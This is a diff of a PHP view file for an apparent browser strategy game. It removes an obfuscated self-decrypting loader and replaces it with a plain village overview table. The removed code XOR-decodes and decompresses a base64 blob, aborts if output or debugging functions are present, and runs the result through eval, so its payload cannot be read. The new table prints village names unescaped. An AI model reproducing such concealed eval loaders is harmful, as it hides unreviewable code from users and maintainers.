@@ -1,24 +1,41 @@
 <?php
-$lyzlcoxr="754f60636050ae2c29c8c03025fd963e";
-$prernobs="5107015f5401520403090009535600020a0b5b0050040700010d525d08005106";
-$fbxwusha="HuiAbC++vgclhBbILZVkujggvAXH9tJzSNGRY8TmAdbsNPJwTggSU05YbMz15MsDKzgwGQajEANc3gm2otFCzexYD8h1uo0zI8lxkEimJP9pUPYMH9XTvtolU0JJYEsIVo0/jFWBh3UNMZ0HXUIZeSBsSrkpmA5WoTZe01tJWOrF21EDa2tYIl11fU/uI+qS7CQZQWubiyC0OUM8Z0Etjj0jMEhqeFbEOey5cIHxAIixZCWpBLMMOk8/ioSFZD45FX2QXySMDv3bEwNv2wgnBpD56wLE7Psbmw8iQTeFLc/K3lTP2+7izkk6xKmaclQrC5Y9RNM0OYikLPbx7GXWGzTqWCm2Gz/3WpZ3xEwDJHL528MujiO88dgObZJMhEd9CnQkTfMJXl7uj3v2dqg+I5lrLqovf4JC2dt6SgmioLD8D8/jbB6IMHKbFHGIPT+NBGFF9bXMgzbPXywDBZdbn340nKv0ekJapjVJBYVzzY0y2U23de5Kql6nvywmEKeoer6TGJNC6WL0kPqkBtDd9HJlrfQ6bFo1OPEHn71dRuOktLG507Ze27NfDHyDd/MSgbOqn5pUuzTPc7g61AzLCsi+wptexjt/A+vCnUFUHlbysSolbxox+98+Ku/k7a/pfdROHRGcgH/ETpOMyMywCuY5QlfP9E4jQXXo9itNtVzSA86PComlKJxTidBIiLM0Raooq1rTd7/0PUEgUO7rDuvYDkwipFQi/6lJGmXuYcvbg6xc3fx/Sxgl3sX2eP9d+IfnZcwPpJWK2vrBcg==";
-$hxrfteik=file_get_contents(__FILE__);
-$spxvhqpl=str_replace($fbxwusha,"",$hxrfteik);
-if(strpos($spxvhqpl,"ec"."ho")!==false||strpos($spxvhqpl,"pr"."int")!==false||strpos($spxvhqpl,"var_"."dump")!==false||strpos($spxvhqpl,"file_put_"."contents")!==false||strpos($spxvhqpl,"fw"."rite")!==false){die();}
-$hbbkhe=str_replace(array($lyzlcoxr,$prernobs),array("SP_812d7c00","KP_416f042a"),$hxrfteik);
-$encortrxw=md5($hbbkhe);
-$mrzcghspim=hex2bin($prernobs);
-$ziwemcia="";
-$ewarkrshk=strlen($encortrxw);
-for($bkrfdkz=0;$bkrfdkz<$ewarkrshk;$bkrfdkz++){
-$ziwemcia.=chr(ord($mrzcghspim[$bkrfdkz])^ord($encortrxw[$bkrfdkz]));
-}
-$delhczkp=base64_decode($fbxwusha);
-$cmfiyz=strlen($delhczkp);
-$khiwksd="";
-$oedygy=strlen($ziwemcia);
-for($bkrfdkz=0;$bkrfdkz<$cmfiyz;$bkrfdkz++){
-$khiwksd.=$delhczkp[$bkrfdkz]^$ziwemcia[$bkrfdkz%$oedygy];
-}
-$gtjoeqvu="gzun"."compress";
-eval('?>' . $gtjoeqvu($khiwksd) . '<?php ');
+/**
+ * Account Manager - Overview Mode
+ * Shows village overview table similar to overview_villages
+ */
+?>
+
+<table class="vis" width="100%">
+    <tr>
+        <th><?= __('screens.am_overview.village') ?></th>
+        <th><?= __('screens.am_overview.points') ?></th>
+        <th><?= __('screens.am_overview.resources') ?></th>
+        <th><?= __('screens.am_overview.storage') ?></th>
+        <th><?= __('screens.am_overview.farm') ?></th>
+    </tr>
+    <?php if (!empty($villages)): ?>
+        <?php foreach ($villages as $vid => $vdata): ?>
+            <tr <?= $vdata['parzysta_liczba'] ? 'class="row_b"' : 'class="row_a"' ?>>
+                <td>
+                    <a href="game.php?village=<?= $vdata['id'] ?>&screen=overview"><?= $vdata['name'] ?>
+                        (<?= $vdata['x'] ?>|<?= $vdata['y'] ?>) K<?= $vdata['continent'] ?></a>
+                </td>
+                <td><?= $vdata['points'] ?></td>
+                <td>
+                    <img src="/graphic/icons/wood.png" title="Madeira" alt="" style="vertical-align: middle;" />
+                    <?= $vdata['r_wood'] ?>
+                    <img src="/graphic/icons/stone.png" title="Argila" alt="" style="vertical-align: middle; margin-left: 10px;" />
+                    <?= $vdata['r_stone'] ?>
+                    <img src="/graphic/icons/iron.png" title="Ferro" alt="" style="vertical-align: middle; margin-left: 10px;" />
+                    <?= $vdata['r_iron'] ?>
+                </td>
+                <td><?= $vdata['storage'] ?? '?' ?></td>
+                <td><?= $vdata['r_bh'] ?> / <?= $vdata['farm'] ?? '?' ?></td>
+            </tr>
+        <?php endforeach; ?>
+    <?php else: ?>
+        <tr>
+            <td colspan="5"><?= __('screens.am_overview.no_villages_found') ?></td>
+        </tr>
+    <?php endif; ?>
+</table>
